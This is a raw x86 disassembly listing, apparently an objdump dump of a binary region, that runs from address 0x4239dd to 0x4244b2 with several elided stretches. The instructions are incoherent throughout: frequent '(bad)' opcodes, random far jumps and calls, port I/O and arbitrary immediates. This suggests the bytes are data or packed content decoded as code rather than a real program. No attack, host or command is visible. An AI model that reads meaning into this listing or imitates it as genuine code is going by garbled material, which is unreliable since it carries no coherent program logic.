  4239dd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4239de:	push   ecx
  4239df:	sbb    eax,0x84a12bbd
  4239e4:	loopne 0x423983
  4239e6:	addr16 jle 0x4239ea
  4239e9:	add    BYTE PTR [eax],al
  4239eb:	add    DWORD PTR [eax],eax
  4239ed:	add    bh,ah
  4239ef:	ja     0x423989
  4239f1:	mov    eax,0xe6f45243
  4239f6:	add    DWORD PTR [esi-0x79b3815a],ebx
  4239fc:	(bad)  
  4239fd:	xor    BYTE PTR [ecx],dl
  4239ff:	xor    esi,esp
  423a01:	test   WORD PTR [edx-0x62a24ecb],di
  423a08:	fild   WORD PTR [eax+eiz*1]
  423a0b:	iret   
  423a0c:	dec    edx
  423a0d:	ficom  DWORD PTR [ebp-0x6003898a]
  423a13:	test   edi,0x6b45bd63
  423a19:	lahf   
  423a1a:	ret    
  423a1b:	xor    eax,0x15c25c74
  423a20:	pop    ds
  423a21:	lahf   
  423a22:	mov    eax,0x3d7b4cb3
  423a27:	iret   
  423a28:	leave  
  423a29:	sbb    DWORD PTR ds:0xca2c70ad,edx
  423a2f:	(bad)  
  423a30:	xor    al,0xfb
  423a32:	or     DWORD PTR [esi+0x7d823224],ebp
  423a38:	xchg   DWORD PTR [ebp+edx*8+0x43],edx
  423a3c:	jae    0x4239dd
  423a3e:	push   es
  423a3f:	es arpl bx,dx
  423a42:	push   esp
  423a43:	mov    WORD PTR [ebp+0x71b5fee3],ss
  423a49:	dec    edi
  423a4a:	sahf   
  423a4b:	fdivr  DWORD PTR [edx]
  423a4d:	add    BYTE PTR [esi],bh
  423a4f:	mul    BYTE PTR [esi+0x50]
  423a52:	jg     0x423a17
  423a54:	into   
  423a55:	push   esi
  423a56:	out    dx,al
  423a57:	add    eax,0x26e717be
  423a5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423a5d:	sbb    DWORD PTR [esi],eax
  423a5f:	push   ebp
  423a60:	aas    
  423a61:	sbb    bh,BYTE PTR [edx+0x7788dbc1]
  423a67:	int    0xc3
  423a69:	test   BYTE PTR [edx-0xb],ch
  423a6c:	stos   BYTE PTR es:[edi],al
  423a6d:	cdq    
  423a6e:	xchg   ebx,eax
  423a6f:	and    DWORD PTR [edx-0x1d],eax
  423a72:	push   esi
  423a73:	mov    ch,0x12
  423a75:	fsub   DWORD PTR [edi+ebp*1]
  423a78:	mov    esi,0xec5a0637
  423a7d:	fimul  WORD PTR [edi]
  423a7f:	xchg   esi,eax
  423a80:	lods   eax,DWORD PTR ds:[esi]
  423a81:	push   es
  423a82:	ds int3 
  423a84:	mov    bl,BYTE PTR [ecx+0x67]
  423a87:	xor    al,0x6d
  423a89:	adc    DWORD PTR [esi+eax*1-0x4fd13a76],eax
  423a90:	mov    edi,0x61bc7c0b
  423a95:	cs loopne 0x423ad9
  423a98:	bnd jne 0x423a7c
  423a9b:	shl    DWORD PTR [ebp+0x42892ac],1
  423aa1:	scas   eax,DWORD PTR es:[edi]
  423aa2:	sbb    BYTE PTR [edx-0x46],cl
  423aa5:	push   0x132b97be
  423aaa:	ret    0xc466
  423aad:	inc    edi
  423aae:	jne    0x423b0a
  423ab0:	sub    BYTE PTR [ebp+0x57da9bee],al
  423ab6:	sub    ebp,DWORD PTR [eax+eax*4+0x651d7a90]
  423abd:	scas   al,BYTE PTR es:[edi]
  423abe:	xchg   esi,eax
  423abf:	pop    eax
  423ac0:	(bad)  
  423ac1:	fst    DWORD PTR [eax]
  423ac3:	sti    
  423ac4:	and    ebx,eax
  423ac6:	loopne 0x423a64
  423ac8:	inc    edi
  423ac9:	popa   
  423aca:	and    bl,cl
  423acc:	pop    eax
  423acd:	in     al,dx
  423ace:	jo     0x423a7b
  423ad0:	xor    dl,BYTE PTR [edx+0x75]
  423ad3:	mov    ch,0x3a
  423ad5:	push   0xffffff8c
  423ad7:	and    edi,esi
  423ad9:	shr    BYTE PTR [edx+0x5a],cl
  423adc:	pop    esp
  423add:	int3   
  423ade:	cmp    eax,0xb66713fd
  423ae3:	std    
  423ae4:	test   eax,0x33c5b39b
  423ae9:	push   ebp
  423aea:	mov    bl,0xeb
  423aec:	jmp    0x423a89
	...
  423b56:	xor    BYTE PTR ds:0xdf7d9f75,bh
  423b5c:	cli    
  423b5d:	mov    edi,0x60851ed8
  423b62:	xlat   BYTE PTR ds:[ebx]
  423b63:	out    dx,eax
  423b64:	(bad)  
  423b65:	aam    0x67
  423b67:	jg     0x423b6a
  423b69:	add    BYTE PTR [eax],al
  423b6b:	add    DWORD PTR [eax],eax
  423b6d:	add    BYTE PTR [esi+0x63c99b82],bh
  423b73:	jp     0x423b10
  423b75:	cmp    ah,bh
  423b77:	bound  ebp,QWORD PTR [esi+0x8989e37]
  423b7d:	call   FWORD PTR [ecx]
  423b7f:	push   cs
  423b80:	shl    ah,cl
  423b82:	mov    esp,0x7455be68
  423b87:	dec    esp
  423b88:	pop    esi
  423b89:	hlt    
  423b8a:	pop    ds
  423b8b:	add    DWORD PTR [ebp-0x7ecf9a62],eax
  423b91:	inc    edi
  423b92:	jnp    0x423c02
  423b94:	popf   
  423b95:	jle    0x423b71
  423b97:	test   ebx,ebx
  423b99:	xor    DWORD PTR [edi+0x7f2db3f6],ebp
  423b9f:	adc    eax,0x33afbc01
  423ba4:	xor    DWORD PTR ds:0xbbbc8edb,eax
  423baa:	mov    dl,0xb7
  423bac:	dec    ecx
  423bad:	jge    0x423bdd
  423baf:	pop    ds
  423bb0:	ret    0x6487
  423bb3:	add    DWORD PTR [ebp-0x17c4b3a5],esp
  423bb9:	sub    BYTE PTR [ecx-0x1f350327],0x8f
  423bc0:	push   ecx
  423bc1:	mov    esi,0x7b528f12
  423bc6:	push   ds
  423bc7:	test   BYTE PTR [eax],ch
  423bc9:	lods   eax,DWORD PTR ds:[esi]
  423bca:	and    dh,ch
  423bcc:	dec    edx
  423bcd:	int3   
  423bce:	repnz arpl WORD PTR [ecx-0x4d],sp
  423bd2:	jmp    0x820e:0x7cab0d5f
  423bd9:	lods   al,BYTE PTR ds:[esi]
  423bda:	int    0x64
  423bdc:	mov    ebx,0x315f66bb
  423be1:	push   edi
  423be2:	and    DWORD PTR [ecx-0x340c370b],esp
  423be8:	xchg   edi,eax
  423be9:	lahf   
  423bea:	cmp    DWORD PTR [esi+0x8cd3bdc],eax
  423bf0:	mov    dh,0x52
  423bf2:	jle    0x423ba0
  423bf4:	cmc    
  423bf5:	xlat   BYTE PTR ds:[ebx]
  423bf6:	(bad)  
  423bf8:	cmp    eax,0x54efe6f6
  423bfd:	or     BYTE PTR [ebp+0x17],0x54
  423c01:	ret    
  423c02:	mov    al,0xac
  423c04:	mov    fs,WORD PTR ds:[ebx]
  423c07:	test   bl,dh
  423c09:	jge    0x423c87
  423c0b:	mov    DWORD PTR [eax+0x6d],eax
  423c0e:	pop    edi
  423c0f:	les    ecx,FWORD PTR [ebx+edi*4-0x6b]
  423c13:	or     ecx,DWORD PTR [eax+0x7b]
  423c16:	adc    DWORD PTR [eax+0x7bfb79d],ebp
  423c1c:	xchg   ebx,eax
  423c1d:	or     ebx,DWORD PTR [edi+eax*1+0x4548c683]
  423c24:	mov    bh,0x57
  423c26:	dec    ebx
  423c27:	ror    edi,0x79
  423c2a:	shl    BYTE PTR [edx-0x13],cl
  423c2d:	addr16 mov dh,bh
  423c30:	aas    
  423c31:	xchg   edx,eax
  423c32:	or     DWORD PTR [esi+0x3a],0x4c
  423c36:	or     al,0x1d
  423c38:	jp     0x423c98
  423c3a:	test   BYTE PTR [ebp-0x30],cl
  423c3d:	mov    ds:0x474f3d4,eax
  423c42:	mov    cl,0x8f
  423c44:	xor    ch,dh
  423c46:	cmp    cl,BYTE PTR [edx]
  423c48:	retf   0x8ab9
  423c4b:	inc    ecx
  423c4c:	xor    DWORD PTR [esp+ebp*8-0x4f],ebx
  423c50:	test   eax,0x8526c02c
  423c55:	icebp  
  423c56:	pop    es
  423c57:	outs   dx,BYTE PTR ds:[esi]
  423c58:	inc    ecx
  423c59:	pop    edx
  423c5a:	cwde   
  423c5b:	jg     0x423c27
  423c5d:	adc    eax,0xc82a4e21
  423c62:	mov    al,0x89
  423c64:	jg     0x423bf2
  423c66:	sar    DWORD PTR [eax+0x33],0x5
  423c6a:	mov    dh,0xe1
  423c6c:	cmc    
  423c6d:	push   edx
	...
  423cd6:	std    
  423cd7:	(bad)  
  423cd8:	test   eax,0xff57ab46
  423cdd:	call   FWORD PTR [eax+0x30446617]
  423ce3:	adc    al,0xfa
  423ce5:	xor    BYTE PTR [edi-0x80],ah
  423ce8:	add    DWORD PTR [eax],eax
  423cea:	add    BYTE PTR [ecx],al
  423cec:	add    BYTE PTR [eax],al
  423cee:	sub    ah,cl
  423cf0:	(bad)  
  423cf1:	mov    bh,0xb6
  423cf3:	mov    WORD PTR [ebp-0x45690d9b],gs
  423cf9:	sub    DWORD PTR [ebx+ecx*4],esp
  423cfc:	ins    BYTE PTR es:[edi],dx
  423cfd:	lods   eax,DWORD PTR ds:[esi]
  423cfe:	sti    
  423cff:	jae    0x423cfa
  423d01:	jne    0x423ca1
  423d03:	cdq    
  423d04:	std    
  423d05:	pop    ebx
  423d06:	inc    ebp
  423d07:	and    al,0xfc
  423d09:	inc    esi
  423d0a:	and    BYTE PTR [esi+0x3043b33e],0x12
  423d11:	inc    ebx
  423d12:	sbb    al,0xeb
  423d14:	sbb    eax,DWORD PTR [ebx]
  423d16:	scas   eax,DWORD PTR es:[edi]
  423d17:	out    dx,eax
  423d18:	push   0xffffff8f
  423d1a:	sahf   
  423d1b:	(bad)  
  423d1c:	icebp  
  423d1d:	std    
  423d1e:	adc    al,0x3e
  423d20:	jo     0x423cfe
  423d22:	add    ecx,ebp
  423d24:	xor    bh,cl
  423d26:	and    eax,0xd0db3e80
  423d2b:	bound  ecx,QWORD PTR [ecx-0x66]
  423d2e:	lods   al,BYTE PTR ds:[esi]
  423d2f:	cmp    BYTE PTR [ebp+0x2c77b823],0x1f
  423d36:	jne    0x423d1c
  423d38:	add    ebx,DWORD PTR [ebp+0x60]
  423d3b:	adc    DWORD PTR [esi+0x3b],ebp
  423d3e:	cmp    eax,0x35717547
  423d43:	xchg   DWORD PTR [ebx],ebp
  423d45:	into   
  423d46:	jmp    0xf02e:0x50f62b71
  423d4d:	stos   BYTE PTR es:[edi],al
  423d4e:	jno    0x423d10
  423d50:	mov    bh,0x8
  423d52:	call   0x976591c0
  423d57:	inc    ecx
  423d58:	dec    ecx
  423d59:	fidivr DWORD PTR [edi-0xa52656d]
  423d5f:	lods   al,BYTE PTR ds:[esi]
  423d60:	sub    al,0x91
  423d62:	(bad)  
  423d63:	jns    0x423ce8
  423d65:	test   eax,0x6ee33e51
  423d6a:	into   
  423d6b:	adc    al,0x45
  423d6d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423d6e:	out    0x9,eax
  423d70:	inc    ebp
  423d71:	sahf   
  423d72:	sbb    DWORD PTR [ecx+0x5b],ebp
  423d75:	mov    edx,0xb6c8afd0
  423d7a:	mov    ch,0xf5
  423d7c:	call   0xa79:0xc1ffc102
  423d83:	sahf   
  423d84:	enter  0x9a6f,0xab
  423d88:	inc    ebx
  423d89:	sbb    DWORD PTR [eax],0xffffffb7
  423d8c:	sbb    ebp,ecx
  423d8e:	sub    eax,0x2ad877d2
  423d93:	fisttp WORD PTR [eax-0x2b]
  423d96:	call   0xb73c:0x8e54425c
  423d9d:	mov    al,ds:0xeb4cfc72
  423da2:	stos   BYTE PTR es:[edi],al
  423da3:	xchg   esp,eax
  423da4:	inc    esi
  423da5:	fdiv   st,st(5)
  423da7:	sub    bl,BYTE PTR ds:0xe9588968
  423dad:	imul   esi,DWORD PTR [ecx],0x62a83abb
  423db3:	dec    edx
  423db4:	retf   
  423db5:	sbb    DWORD PTR [edx+0x5ae2ff9c],0xf6f3792c
  423dbf:	push   ss
  423dc0:	shr    BYTE PTR [ebp-0x51],cl
  423dc3:	jnp    0x423db7
  423dc5:	jmp    0xef87ff6
  423dca:	stc    
  423dcb:	into   
  423dcc:	mov    esp,0xc4343231
  423dd1:	inc    edi
  423dd2:	pop    ebp
  423dd3:	icebp  
  423dd4:	fcmove st,st(7)
  423dd6:	lods   eax,DWORD PTR ds:[esi]
  423dd7:	lods   eax,DWORD PTR ds:[esi]
  423dd8:	and    eax,0xfa52cff1
  423ddd:	pop    ecx
  423dde:	inc    ebp
  423ddf:	fld    QWORD PTR [edx+ebp*1-0x512bfd36]
  423de6:	push   ds
  423de7:	inc    eax
  423de8:	(bad)  
  423dea:	push   esi
  423deb:	fsub   DWORD PTR [edi+ebx*2+0x0]
	...
  423e56:	(bad)  
  423e57:	test   BYTE PTR [edi-0x118668f7],0xff
  423e5e:	daa    
  423e5f:	mov    DWORD PTR [eax-0x21139b2e],esp
  423e65:	ja     0x423ece
  423e67:	add    DWORD PTR [ecx],0x10000
  423e6d:	add    BYTE PTR [ebx+0x72],ah
  423e70:	jbe    0x423edc
  423e72:	cmp    eax,0xdc6dc067
  423e77:	pop    edi
  423e78:	inc    ebx
  423e79:	push   esp
  423e7a:	test   al,0x2b
  423e7c:	jp     0x423e2a
  423e7e:	jbe    0x423ecc
  423e80:	jae    0x423e47
  423e82:	inc    BYTE PTR [ebp-0x4db1e3a2]
  423e88:	repz mov edx,0x721be245
  423e8e:	sti    
  423e8f:	in     al,0x4a
  423e91:	repz out 0x96,al
  423e94:	jbe    0x423ec0
  423e96:	dec    ecx
  423e97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423e98:	ds js  0x423eea
  423e9b:	cmc    
  423e9c:	retf   0xc61d
  423e9f:	and    eax,DWORD PTR [ebx]
  423ea1:	push   esi
  423ea2:	xchg   ecx,eax
  423ea3:	sahf   
  423ea4:	xor    BYTE PTR [ebx],dl
  423ea6:	out    dx,eax
  423ea7:	and    DWORD PTR [esi+ebp*1-0x2b52368],0xffffffb9
  423eaf:	push   es
  423eb0:	scas   eax,DWORD PTR es:[edi]
  423eb1:	icebp  
  423eb2:	cmp    DWORD PTR [ebx+ebp*1-0x24c8c88f],esp
  423eb9:	into   
  423eba:	fdiv   QWORD PTR [ebx]
  423ebc:	ja     0x423e65
  423ebe:	std    
  423ebf:	jp     0x423f3d
  423ec1:	push   esp
  423ec2:	aad    0xc
  423ec4:	in     al,0xcc
  423ec6:	scas   al,BYTE PTR es:[edi]
  423ec7:	and    DWORD PTR [edi-0x6f7a7b23],edi
  423ecd:	in     al,dx
  423ece:	mov    ah,0xbb
  423ed0:	push   ecx
  423ed1:	adc    ecx,DWORD PTR [edi-0x43]
  423ed4:	mov    es,WORD PTR ds:0xf8780a74
  423eda:	gs retf 
  423edc:	repz jbe 0x423f33
  423edf:	retf   
  423ee0:	mov    eax,0x51b52cde
  423ee5:	mov    esi,DWORD PTR [ecx+eax*4-0x526a6286]
  423eec:	add    cl,BYTE PTR [edx+0x6f]
  423eef:	(bad)  
  423ef0:	sbb    eax,0x14a19025
  423ef5:	sti    
  423ef6:	dec    esp
  423ef7:	scas   eax,DWORD PTR es:[edi]
  423ef8:	push   edi
  423ef9:	xchg   ebp,eax
  423efa:	fs xchg edx,eax
  423efc:	sti    
  423efd:	mov    eax,0xa89f36c6
  423f02:	xor    eax,0xde1c03c0
  423f07:	and    al,0xf1
  423f09:	xor    edx,DWORD PTR [ebx+0x1c95783e]
  423f0f:	pop    esp
  423f10:	dec    ebp
  423f11:	mov    dh,BYTE PTR [edi-0x3a]
  423f14:	adc    DWORD PTR [ecx],0xfd275fec
  423f1a:	dec    esi
  423f1b:	push   ss
  423f1c:	repz mov bh,0x4f
  423f1f:	pop    eax
  423f20:	cli    
  423f21:	sbb    BYTE PTR [esi-0x31],dl
  423f24:	push   edx
  423f25:	lods   al,BYTE PTR ds:[esi]
  423f26:	rcl    BYTE PTR [edx-0x5bab9e2],cl
  423f2c:	clc    
  423f2d:	pop    ecx
  423f2e:	xor    dh,ah
  423f30:	add    al,0xb6
  423f32:	adc    al,0x64
  423f34:	cmp    esi,DWORD PTR [ecx-0x3df0c0f2]
  423f3a:	cdq    
  423f3b:	inc    ebp
  423f3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423f3d:	jns    0x423ef4
  423f3f:	daa    
  423f40:	loop   0x423edd
  423f42:	mov    ds:0x1b96c10,eax
  423f47:	imul   BYTE PTR ds:0x51f672f8
  423f4d:	daa    
  423f4e:	or     DWORD PTR [ecx+0x15],eax
  423f51:	pop    ebp
  423f52:	xlat   BYTE PTR ds:[ebx]
  423f53:	test   eax,0xfedb3352
  423f58:	aam    0xe2
  423f5a:	inc    eax
  423f5b:	sbb    bh,BYTE PTR [ecx+edi*8-0x38f392ce]
  423f62:	inc    edi
  423f63:	or     eax,edi
  423f65:	aad    0x39
  423f67:	sub    DWORD PTR [edx],ebx
  423f69:	xor    eax,0x784e8d3b
	...
  423fd6:	scas   al,BYTE PTR es:[edi]
  423fd7:	call   0x9fff:0xff74b964
  423fde:	adc    al,0x96
  423fe0:	sbb    al,0xd9
  423fe2:	test   al,0x9
  423fe4:	add    esp,DWORD PTR [ebx]
  423fe6:	add    BYTE PTR [bx+di],0x0
  423fea:	add    BYTE PTR [ecx],al
  423fec:	add    BYTE PTR [eax],al
  423fee:	test   eax,0x2939afe
  423ff3:	(bad)  
  423ff4:	dec    esi
  423ff5:	daa    
  423ff6:	call   0xbb438c02
  423ffb:	into   
  423ffc:	in     al,dx
  423ffd:	fwait
  423ffe:	retf   
  423fff:	xchg   DWORD PTR [ebx-0x486042bc],edi
  424005:	rcr    DWORD PTR [edx-0x47],cl
  424008:	loop   0x423fb0
  42400a:	cld    
  42400b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42400c:	neg    cl
  42400e:	add    dl,0x8d
  424011:	xchg   ecx,eax
  424012:	ds je  0x42407a
  424015:	pop    ebx
  424016:	mov    WORD PTR [esi+eax*1-0x39],es
  42401a:	adc    eax,0x3714272c
  42401f:	test   BYTE PTR [ecx*4-0x64a1255d],0xa1
  424027:	push   esi
  424028:	retf   
  424029:	enter  0x1b3c,0xa6
  42402d:	sar    DWORD PTR [esp+ecx*2-0x2a],cl
  424031:	mov    edi,DWORD PTR [edx+ecx*8-0x567b6bb7]
  424038:	pusha  
  424039:	repnz pop ebp
  42403b:	mov    al,ds:0x8bc1e93c
  424040:	nop
  424041:	ds shl esi,cl
  424044:	shr    DWORD PTR [eiz*4+0x79977ea4],0x64
  42404c:	pusha  
  42404d:	pop    esi
  42404e:	call   0xe925fd9e
  424053:	fdivr  DWORD PTR [edi+0x2d]
  424056:	add    ah,BYTE PTR [esi+ecx*2-0x4c]
  42405a:	and    edi,DWORD PTR [edi-0x5e]
  42405d:	push   ebx
  42405e:	mov    ebx,0xd1a7dc92
  424063:	cs or  ah,0xcc
  424067:	mul    ebp
  424069:	aam    0xb6
  42406b:	int    0xe9
  42406d:	xor    dl,ah
  42406f:	push   ebx
  424070:	and    al,0x9b
  424072:	ja     0x424077
  424074:	sahf   
  424075:	out    dx,eax
  424076:	fsubr  st,st(3)
  424078:	push   0xf88bb537
  42407d:	xchg   esi,eax
  42407e:	fmul   DWORD PTR [edx+0x190310a7]
  424084:	repnz clc 
  424086:	fld    QWORD PTR [ecx-0x1]
  424089:	mov    ebx,0x7ad945ac
  42408e:	xchg   DWORD PTR [ebx+0x78ad9dc9],esi
  424094:	jns    0x42405c
  424096:	pop    esp
  424097:	clc    
  424098:	jne    0x424054
  42409a:	std    
  42409b:	pop    edi
  42409c:	mov    dh,0x78
  42409e:	or     al,0xdb
  4240a0:	and    BYTE PTR ss:[edx+0x7c30047],0x8e
  4240a8:	inc    ecx
  4240a9:	adc    edi,DWORD PTR [ebp+0x4c]
  4240ac:	mov    ebp,0xf888448f
  4240b1:	mov    dl,bh
  4240b3:	stos   BYTE PTR es:[edi],al
  4240b4:	call   FWORD PTR [eax-0x3e]
  4240b7:	je     0x42404f
  4240b9:	rcr    dl,1
  4240bb:	pop    ebp
  4240bc:	das    
  4240bd:	mov    cl,BYTE PTR [edi+0x6a1e01f7]
  4240c3:	ss xchg dx,ax
  4240c6:	mov    ds:0x70cd24aa,eax
  4240cb:	mov    ecx,0xf73a2ec
  4240d0:	add    edi,DWORD PTR [edi+0xd2b71d3]
  4240d6:	dec    ebx
  4240d7:	rcl    DWORD PTR [edx+0x74],0xda
  4240db:	popa   
  4240dc:	xor    ebp,edx
  4240de:	mov    bh,0xb8
  4240e0:	sub    eax,0x1385aff1
  4240e5:	sbb    al,0x73
  4240e7:	dec    edi
  4240e8:	(bad)  
  4240e9:	jmp    0x36734c0f
	...
  424156:	jl     0x4241b0
  424158:	cs mov cl,0x2e
  42415b:	idiv   edi
  42415d:	(bad)  
  42415f:	jne    0x424128
  424161:	iret   
  424162:	repnz test eax,0x8367a429
  424168:	add    DWORD PTR [eax],eax
  42416a:	add    BYTE PTR [ecx],al
  42416c:	add    BYTE PTR [eax],al
  42416e:	(bad)  
  42416f:	xchg   esp,eax
  424170:	sub    BYTE PTR [ecx-0x32],ch
  424173:	xor    DWORD PTR [eax-0x3],0xe366f649
  42417a:	and    dh,BYTE PTR [ebx-0xbf120c2]
  424180:	mov    ah,0xeb
  424182:	dec    esp
  424183:	mov    bh,0xca
  424185:	ror    DWORD PTR [edx-0x7f],0x3c
  424189:	xor    DWORD PTR [ebx],0xc6e837fd
  42418f:	sub    eax,0xae33169
  424194:	and    eax,0x72cb9b94
  424199:	cld    
  42419a:	cmp    dh,dl
  42419c:	add    al,0xd5
  42419e:	adc    BYTE PTR [ebp+ebp*1-0xa],dl
  4241a2:	inc    ebx
  4241a3:	xor    BYTE PTR [esi],bh
  4241a5:	(bad)  
  4241a7:	sbb    eax,0xf8267dd9
  4241ac:	mov    ds:0xeb4d2a6e,al
  4241b1:	inc    edx
  4241b2:	jmp    0x4241ea
  4241b4:	mov    esi,0x7d9dce82
  4241b9:	(bad)  
  4241ba:	loop   0x42417d
  4241bc:	mov    ecx,0x5b976921
  4241c1:	and    eax,0xa41aebb6
  4241c6:	xchg   edx,eax
  4241c7:	add    al,al
  4241c9:	xlat   BYTE PTR ds:[ebx]
  4241ca:	imul   BYTE PTR [ebx]
  4241cc:	cli    
  4241cd:	daa    
  4241ce:	and    al,0x51
  4241d0:	int3   
  4241d1:	xlat   BYTE PTR ds:[ebx]
  4241d2:	int    0xe0
  4241d4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4241d5:	call   0x795a:0xb9786f96
  4241dc:	mov    ebx,0x1f4ecd20
  4241e1:	mov    esi,0x851857dc
  4241e6:	add    BYTE PTR [ecx+0x4bebb6b3],ah
  4241ec:	fist   WORD PTR [ecx-0x438551eb]
  4241f2:	jne    0x424180
  4241f4:	pop    esp
  4241f5:	jns    0x424227
  4241f7:	sub    cl,dh
  4241f9:	daa    
  4241fa:	mov    ds:0xf5ea3593,al
  4241ff:	xchg   esi,eax
  424200:	or     BYTE PTR [edi-0x2f],ah
  424203:	mov    dh,0x5d
  424205:	inc    ecx
  424206:	adc    al,0x54
  424208:	sub    eax,0x18a3a8c1
  42420d:	dec    edi
  42420e:	stc    
  42420f:	loope  0x4241ad
  424211:	jge    0x4241fd
  424213:	add    ebx,DWORD PTR [ebp-0x7e50433f]
  424219:	xchg   edi,eax
  42421a:	pop    es
  42421b:	or     eax,0xb05e7525
  424220:	idiv   BYTE PTR [edi]
  424222:	cdq    
  424223:	pushf  
  424224:	das    
  424225:	popa   
  424226:	in     eax,dx
  424227:	mov    BYTE PTR [ecx],cl
  424229:	test   BYTE PTR [esi+0x5ccdb044],bh
  42422f:	retf   
  424230:	jne    0x42420a
  424232:	enter  0x64d3,0x97
  424236:	adc    al,0x6
  424238:	inc    edi
  424239:	rcl    DWORD PTR [ecx-0x4aee5e71],0x62
  424240:	repz jne 0x424208
  424243:	lock rcr ebx,1
  424246:	lods   al,BYTE PTR ds:[esi]
  424247:	test   al,0x1c
  424249:	and    al,0x94
  42424b:	clc    
  42424c:	push   0x6908ad66
  424251:	inc    esp
  424252:	ds popa 
  424254:	mov    ebx,0xbd0c5f2a
  424259:	xchg   edx,eax
  42425a:	sub    al,0xbe
  42425c:	ror    DWORD PTR ds:0xd0e3d868,1
  424262:	pop    ds
  424263:	aas    
  424264:	addr16 fsubrp st(7),st
  424267:	pop    esi
  424268:	aas    
  424269:	xchg   ebp,eax
  42426a:	into   
  42426b:	inc    esp
  42426c:	inc    edi
  42426d:	mov    ds:0x0,al
	...
  4242d6:	xchg   DWORD PTR [ebx+eiz*4-0x204c28],esi
  4242dd:	push   DWORD PTR [ecx+0x7]
  4242e0:	sub    al,0x5c
  4242e2:	cwde   
  4242e3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4242e4:	ret    0x6705
  4242e7:	test   BYTE PTR [ecx],al
  4242e9:	add    BYTE PTR [eax],al
  4242eb:	add    DWORD PTR [eax],eax
  4242ed:	add    BYTE PTR [esi+0x4f5a6f15],dh
  4242f3:	cmc    
  4242f4:	inc    edi
  4242f5:	mov    WORD PTR [ebx],cs
  4242f7:	nop
  4242f8:	xor    DWORD PTR [esi+edi*4],esi
  4242fb:	(bad)  
  4242fc:	jmp    0x6dde:0x4c8b4ecb
  424303:	leave  
  424304:	iret   
  424305:	xor    eax,0xc8a33a17
  42430a:	ret    
  42430b:	mov    al,cs:0xd221341b
  424311:	jns    0x424338
  424313:	pop    ebx
  424314:	pop    ecx
  424315:	adc    BYTE PTR [eax-0x65433066],0xf9
  42431c:	mov    bh,ch
  42431e:	sbb    esi,DWORD PTR ss:0x6630efcf
  424325:	sbb    edx,DWORD PTR [ebx-0x4d1d23d4]
  42432b:	hlt    
  42432c:	sbb    DWORD PTR [edi],0x105868f4
  424332:	jmp    0x4559:0xa3ed21a0
  424339:	xlat   BYTE PTR ds:[ebx]
  42433a:	lock inc ebx
  42433c:	mov    esp,DWORD PTR ds:0xc7380c5f
  424342:	ret    0xf192
  424345:	fisttp WORD PTR [edi]
  424347:	sub    ecx,DWORD PTR [esi+0x79]
  42434a:	or     al,0xa
  42434c:	fidivr WORD PTR [ebx]
  42434e:	in     al,dx
  42434f:	repnz add DWORD PTR ds:0x96d49684,edi
  424356:	and    al,0xa2
  424358:	pusha  
  424359:	mov    esp,ebp
  42435b:	xchg   ebx,eax
  42435c:	scas   eax,DWORD PTR es:[edi]
  42435d:	add    eax,0x1c5a37f9
  424362:	sub    al,0x92
  424364:	and    al,BYTE PTR [ecx+0x1b61f8fd]
  42436a:	sub    DWORD PTR [ebx-0x68cb20cf],0x4e
  424371:	popf   
  424372:	push   eax
  424373:	xor    ax,0x85f7
  424377:	jae    0x424325
  424379:	aam    0xa7
  42437b:	imul   edx,esi,0xa23e0717
  424381:	dec    edi
  424382:	in     al,0x7c
  424384:	stos   BYTE PTR es:[edi],al
  424385:	inc    ebp
  424386:	stc    
  424387:	sbb    DWORD PTR [esi+0x363ed93f],esi
  42438d:	xor    BYTE PTR [ecx-0x3e],bh
  424390:	mov    al,0x1b
  424392:	js     0x42437f
  424394:	in     eax,0x24
  424396:	mov    WORD PTR [ebp-0x3f],cs
  424399:	mov    eax,0xf51ebd5
  42439e:	sbb    al,ah
  4243a0:	inc    edx
  4243a1:	cli    
  4243a2:	push   ecx
  4243a3:	adc    DWORD PTR [eax+0x226396b8],0x5384268c
  4243ad:	sbb    eax,0xf187eb60
  4243b2:	dec    ecx
  4243b3:	cmp    BYTE PTR es:[edx-0x3e],0x1a
  4243b8:	mov    ch,0x95
  4243ba:	pop    esp
  4243bb:	daa    
  4243bc:	ret    0xe76a
  4243bf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4243c0:	mov    bl,0x18
  4243c2:	rcr    BYTE PTR [edx-0x63700c50],0x8
  4243c9:	das    
  4243ca:	push   esi
  4243cb:	fpatan 
  4243cd:	out    dx,eax
  4243ce:	ds ins BYTE PTR es:[edi],dx
  4243d0:	add    al,0x7e
  4243d2:	push   eax
  4243d3:	fs mov ch,0x92
  4243d6:	js     0x4243c8
  4243d8:	out    dx,al
  4243d9:	mov    ds,WORD PTR [eax-0x23a4567d]
  4243df:	and    BYTE PTR [eax+0x73f308b6],al
  4243e5:	jp     0x4243db
  4243e7:	mov    ah,0xd3
  4243e9:	(bad)  
  4243ea:	daa    
  4243eb:	pop    ebx
  4243ec:	mov    gs,WORD PTR [esi+0x0]
	...
  424453:	add    BYTE PTR [eax],al
  424455:	add    BYTE PTR [edx-0x24582da],cl
  42445b:	sti    
  42445c:	iret   
  42445d:	ss aam 0xb
  424460:	push   ss
  424461:	jno    0x424477
  424463:	pop    esi
  424464:	push   0x185676e
  424469:	add    BYTE PTR [eax],al
  42446b:	add    DWORD PTR [eax],eax
  42446d:	add    BYTE PTR [edx-0x4e],ah
  424470:	push   ebx
  424471:	das    
  424472:	fist   WORD PTR [ebx]
  424474:	mov    cl,BYTE PTR [ebx]
  424476:	jecxz  0x4244a8
  424478:	xor    al,0x35
  42447a:	lds    ecx,FWORD PTR [edi+0x5ffdc457]
  424480:	or     eax,0xfd7dd9fd
  424485:	leave  
  424486:	jg     0x42448c
  424488:	addr16 dec ecx
  42448a:	dec    ebp
  42448b:	push   ss
  42448c:	xchg   ebp,eax
  42448d:	add    edx,DWORD PTR [edi+0x7bbf22ce]
  424493:	jmp    0x4af1a502
  424498:	aaa    
  424499:	sub    eax,0x4609d370
  42449e:	push   ss
  42449f:	call   0x402d:0x3a9c5ba1
  4244a6:	adc    esp,edi
  4244a8:	cmp    esp,DWORD PTR [eax]
  4244aa:	add    al,dl
  4244ac:	gs adc eax,0xe37bbbc7
  4244b2:	leave  
